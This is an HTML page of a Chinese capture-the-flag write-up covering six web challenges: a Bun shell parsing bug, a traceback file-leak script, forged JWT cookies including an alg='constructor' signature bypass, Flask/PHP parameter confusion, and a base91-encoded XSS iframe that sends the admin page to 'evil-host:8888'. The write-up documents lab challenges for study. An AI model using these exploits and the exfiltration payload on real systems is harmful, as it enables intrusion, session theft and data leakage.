@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/huaji.ico >
+    <title>
+        blog
+    </title>
+    <meta name="description" content= 歪比歪比 >
+    <meta name="keywords" content= Blog,Hexo,Huaji >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            fengshentai
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h2 id="封神台wp"><a href="#封神台wp" class="headerlink" title="封神台wp"></a>封神台wp</h2><p>两天的比赛，第一天好好看了，没做出来几个题，第二天出去玩拿手机看代码楞是出了俩。</p>
+<p>技术不行，只有高校榜第四，没什么石粒，下回还要多练。</p>
+<h3 id="EzEcho"><a href="#EzEcho" class="headerlink" title="EzEcho"></a>EzEcho</h3><p>bun 内部shell的解析bug</p>
+<p>先创建文件并将内容写入sh脚本里面，然后再执行sh</p>
+<p>好像是<code>1</code> 被当作触发重定向的标识，没有写入，作为文本内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/readflag1&lt;huaji</span><br><span class="line"></span><br><span class="line">`sh&lt;huaji`</span><br></pre></td></tr></table></figure>
+
+<p>flag{rce_eas1y_th3n_i_think}</p>
+<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_83799022/article/details/141859729">https://blog.csdn.net/2401_83799022/article/details/141859729</a></p>
+<h3 id="EzPyeditor"><a href="#EzPyeditor" class="headerlink" title="EzPyeditor"></a>EzPyeditor</h3><p>因为 <code>traceback.format_exc()</code> 会把 <strong>异常栈的文件路径和代码上下文</strong> 返回给前端，如果我们把 <code>filename</code> 指向 <code>secret.py</code>，并且让 <code>source</code> 是空的（触发解析报错），那么 traceback 会尝试 <strong>从这个文件加载源码行内容</strong>，从而把 <code>secret.py</code> 里的 flag 泄露出来。</p>
+<p>可以用 <code>source</code> 构造一个在指定行触发错误的假代码，让 traceback 去那一行读取内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;source&quot;: &quot;\n\n\n\nx y&quot;,  </span><br><span class="line">    &quot;filename&quot;: &quot;secret.py&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://rc0uy94d.lab.aqlab.cn/check&quot;</span>   <span class="comment"># 改成你的靶场地址</span></span><br><span class="line">target_file = <span class="string">&quot;secret.py&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_line</span>(<span class="params">line_num</span>):</span><br><span class="line">    <span class="comment"># 构造 source，让错误出现在指定行</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;source&quot;</span>: <span class="string">&quot;\n&quot;</span> * (line_num - <span class="number">1</span>) + <span class="string">&quot;x y&quot;</span>,  <span class="comment"># x y 触发语法错误</span></span><br><span class="line">        <span class="string">&quot;filename&quot;</span>: target_file</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, json=payload)</span><br><span class="line">    data = r.json()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data[<span class="string">&quot;status&quot;</span>] <span class="keyword">and</span> data[<span class="string">&quot;error&quot;</span>]:</span><br><span class="line">        <span class="comment"># 从 traceback 中提取对应行</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">rf&#x27;File &quot;<span class="subst">&#123;re.escape(target_file)&#125;</span>&quot;, line <span class="subst">&#123;line_num&#125;</span>\n\s*(.*)\n&#x27;</span>, data[<span class="string">&quot;error&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_file</span>(<span class="params">max_lines=<span class="number">100</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Dumping <span class="subst">&#123;target_file&#125;</span> ...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_lines+<span class="number">1</span>):</span><br><span class="line">        line = read_line(i)</span><br><span class="line">        <span class="keyword">if</span> line <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i:03d&#125;</span>: <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    dump_file()</span><br><span class="line"><span class="comment">#flag&#123;y0ur_1re_pyc0de_master!&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="EzGrades"><a href="#EzGrades" class="headerlink" title="EzGrades"></a>EzGrades</h3><p>创建用户时，加上is_teacher&#x3D;true即可</p>
+<p><img src="/fengshentai/image-20250810213755826.png" alt="image-20250810213755826"></p>
+<p>然后再访问&#x2F;grades_flag就有flag了，其中cookie是<code>auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdHVfbnVtIjoiaHVhamkiLCJzdHVfZW1haWwiOiJodWFqaUBodWFqaS5jb20iLCJwYXNzd29yZCI6IjEiLCJpc190ZWFjaGVyIjoidHJ1ZSJ9.4bhDOIr-X_u68snoXl5pwMG-v0HGMXyi7nzAXp62GrY</code></p>
+<p>flag{g00d_go0d_study_d1yd1yup}</p>
+<h3 id="EzGetFlag"><a href="#EzGetFlag" class="headerlink" title="EzGetFlag"></a>EzGetFlag</h3><p>使用 两个字段：</p>
+<p>第一个 给 Flask 看，第二个给 PHP 看</p>
+<p>因为php会被变量绕过，flask接收了第一个，php相当于接收的第二个</p>
+<p><img src="/fengshentai/image-20250810214427451.png" alt="image-20250810214427451"></p>
+<h1 id="EzJwt-Wp"><a href="#EzJwt-Wp" class="headerlink" title="EzJwt Wp"></a>EzJwt Wp</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> algorithms = &#123;</span><br><span class="line">	<span class="attr">hs256</span>: <span class="function">(<span class="params">data, secret</span>) =&gt;</span> </span><br><span class="line">		<span class="title function_">base64UrlEncode</span>(crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, secret).<span class="title function_">update</span>(data).<span class="title function_">digest</span>()),</span><br><span class="line">	<span class="attr">hs512</span>: <span class="function">(<span class="params">data, secret</span>) =&gt;</span> </span><br><span class="line">		<span class="title function_">base64UrlEncode</span>(crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha512&#x27;</span>, secret).<span class="title function_">update</span>(data).<span class="title function_">digest</span>()),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createSignature</span> = (<span class="params">header, payload, secret</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> data = <span class="string">`<span class="subst">$&#123;stringifyPart(header)&#125;</span>.<span class="subst">$&#123;stringifyPart(payload)&#125;</span>`</span>;</span><br><span class="line">	<span class="keyword">const</span> signature = algorithms[header.<span class="property">alg</span>.<span class="title function_">toLowerCase</span>()](data, secret);</span><br><span class="line">	<span class="keyword">return</span> signature;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">verify</span> = (<span class="params">token, secret</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> &#123; header, payload, <span class="attr">signature</span>: expected_signature &#125; = <span class="title function_">parseToken</span>(token);</span><br><span class="line">	<span class="keyword">const</span> calculated_signature = <span class="title function_">createSignature</span>(header, payload, secret);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">const</span> calculated_buf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(calculated_signature, <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(calculated_buf)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(calculated_buf.<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">	<span class="keyword">const</span> expected_buf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(expected_signature, <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(expected_buf)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title class_">Buffer</span>.<span class="title function_">compare</span>(calculated_buf, expected_buf) !== <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid signature&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计，发现后端在校验 JWT 时没有制定加密算法，于是想到可以手动指定 alg 标签来使得后端不使用那两种加密算法来进行验证，但是问题是 <code>algorithms</code> 只有两个元素，我们可以通过 JS 的特性找到一个 <code>Object</code> 或者 <code>&#123;&#125;</code> 对象本来就具有的函数，经过测试，我选择使用 <code>constructor()</code>，直接调用这个函数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  &gt; <span class="keyword">let</span> a = &#123;&#125;</span><br><span class="line">... a[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&quot;123&quot;</span>,<span class="string">&quot;456&quot;</span>)</span><br><span class="line"><span class="title class_">String</span> &#123;<span class="string">&#x27;123&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，发现思路可行后，就直接修改本地代码获得签名之后的 base64。</p>
+<p><img src="/fengshentai/image-20250810231109801.png" alt="image-20250810231109801"></p>
+<p>修改后：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAiY29uc3RydWN0b3IiLAogICJ0eXAiOiAiSldUIgp9.ewogICJpc0FkbWluIjogdHJ1ZQp9.eyJhbGciOiJjb25zdHJ1Y3RvciIsInR5cCI6IkpXVCJ9eyJpc0FkbWluIjp0cnVlfQ</span><br></pre></td></tr></table></figure>
+
+<p>使用这个 cookie 去访问网站，拿到 cookie：</p>
+<p><img src="/fengshentai/image-20250810230839382.png" alt="image-20250810230839382"></p>
+<p>flag 为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;jwt_i_w0nt_see_you!:(&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="EzBase-Wp"><a href="#EzBase-Wp" class="headerlink" title="EzBase Wp"></a>EzBase Wp</h3><p>代码审计，发现题目会将用户上传的数据进行 base91 编码，然后显示出来，于是逆向思维，让编码后的文本为 xss payload，再 decode，就能拿到应该上传的数据。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> based91</span><br><span class="line"></span><br><span class="line">res = based91.decode(<span class="string">&quot;&lt;iframe/src=\&quot;javascript%3Afetch%28%27%2F%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28s%3D%3E%7Bnew%20Image%28%29%2Esrc%3D%60http%3A%2F%2Fevil%2Dhost%3A8888%2Fget%5Fcookie%3Fcookie%3D%24%7BencodeURIComponent%28s%2Esubstring%280%2C2000%29%29%7D%60%7D%29%2Ecatch%28console%2Eerror%29%3B\&quot;&gt;link&lt;/iframe&gt;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(based91.encode(res))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>iframe 中的 js 使用的 url 编码，同时 iframe 和 src 之间使用 <code>/</code> 隔开以避免使用空格，原始 js 代码为：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">fetch</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">s</span>=&gt;</span>&#123;<span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">`http://evil-host:8888/get_cookie?cookie=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(s.substring(<span class="number">0</span>,<span class="number">2000</span>))&#125;</span>`</span>&#125;).<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>);</span><br></pre></td></tr></table></figure>
+
+<p> 执行脚本：</p>
+<p><img src="/fengshentai/image-20250810232114525.png" alt="image-20250810232114525"></p>
+<p>在页面上传：</p>
+<p><img src="/fengshentai/image-20250810232225908.png" alt="image-20250810232225908"></p>
+<p>然后让 bot 访问这个页面：</p>
+<p><img src="/fengshentai/image-20250810232258302.png" alt="image-20250810232258302"></p>
+<p>服务器拿到管理员首页页面源代码：</p>
+<p><img src="/fengshentai/image-20250810232357014.png" alt="image-20250810232357014"></p>
+<p>访问 flag 所在 encoding，拿到 flag：</p>
+<p><img src="/fengshentai/image-20250810232917139.png" alt="image-20250810232917139"></p>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: Huaji | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
